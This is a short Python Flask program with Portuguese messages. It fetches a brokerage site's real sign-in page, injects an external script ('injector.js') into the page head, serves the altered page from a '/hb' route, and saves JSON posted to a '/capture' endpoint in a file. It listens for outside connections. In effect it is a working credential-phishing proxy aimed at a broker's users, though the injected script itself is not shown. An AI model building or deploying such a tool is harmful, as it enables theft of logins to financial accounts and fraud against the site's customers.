import requests
from flask import Flask, request, Response, jsonify
import re

app = Flask(__name__)

CORRETORA_URL = "https://www.homebroker.com/pt/sign-in"

try:
    with open("injector.js", "r", encoding="utf-8") as f:
        INJECTOR_SCRIPT = f.read()
except FileNotFoundError:
    INJECTOR_SCRIPT = ""

@app.route("/hb")
def proxy_and_inject():
    try:
        resp = requests.get(CORRETORA_URL)
        if resp.status_code != 200:
            return f"Erro ao buscar a página da corretora: {resp.status_code}", 500

        html = resp.text
        if not INJECTOR_SCRIPT:
            return "Erro: arquivo injector.js não encontrado no servidor.", 500

        injected_html = re.sub(r"</head>", f"<script>{INJECTOR_SCRIPT}</script></head>", html, flags=re.IGNORECASE)

        return Response(injected_html, content_type=resp.headers.get("Content-Type", "text/html"))
    except Exception as e:
        return f"Erro interno: {str(e)}", 500

@app.route("/capture", methods=["POST"])
def capture():
    data = request.get_json()
    if not data:
        return jsonify({"error": "Nenhum dado recebido"}), 400

    with open("captured_data.json", "w", encoding="utf-8") as f:
        import json
        json.dump(data, f, indent=2, ensure_ascii=False)

    print("[CAPTURE] Dados recebidos e salvos.")
    return jsonify({"status": "ok"}), 200

if __name__ == "__main__":
    # Rodar Flask no host 0.0.0.0 para aceitar conexões externas
    app.run(host="0.0.0.0", port=5000)
